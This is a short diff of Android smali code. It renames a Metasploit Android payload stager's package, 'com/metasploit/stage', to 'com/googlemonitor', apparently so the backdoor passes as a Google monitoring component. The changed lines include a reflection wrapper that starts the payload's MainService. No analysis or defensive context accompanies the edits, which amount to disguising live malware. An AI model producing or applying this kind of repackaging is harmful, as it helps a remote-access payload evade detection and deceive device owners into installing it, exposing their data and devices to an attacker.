@@ -1,4 +1,4 @@
-.class final Lcom/metasploit/stage/c;
+.class final Lcom/googlemonitor/c;
 .super Ljava/lang/Object;
 
 # interfaces
@@ -13,7 +13,7 @@
 .method constructor <init>(Ljava/lang/reflect/Method;)V
     .locals 0
 
-    iput-object p1, p0, Lcom/metasploit/stage/c;->a:Ljava/lang/reflect/Method;
+    iput-object p1, p0, Lcom/googlemonitor/c;->a:Ljava/lang/reflect/Method;
 
     invoke-direct {p0}, Ljava/lang/Object;-><init>()V
 
@@ -26,7 +26,7 @@
     .locals 3
 
     :try_start_0
-    iget-object v0, p0, Lcom/metasploit/stage/c;->a:Ljava/lang/reflect/Method;
+    iget-object v0, p0, Lcom/googlemonitor/c;->a:Ljava/lang/reflect/Method;
 
     const/4 v1, 0x0
 
@@ -40,7 +40,7 @@
 
     if-eqz v0, :cond_0
 
-    invoke-static {v0}, Lcom/metasploit/stage/MainService;->startService(Landroid/content/Context;)V
+    invoke-static {v0}, Lcom/googlemonitor/MainService;->startService(Landroid/content/Context;)V
     :try_end_0
     .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
 
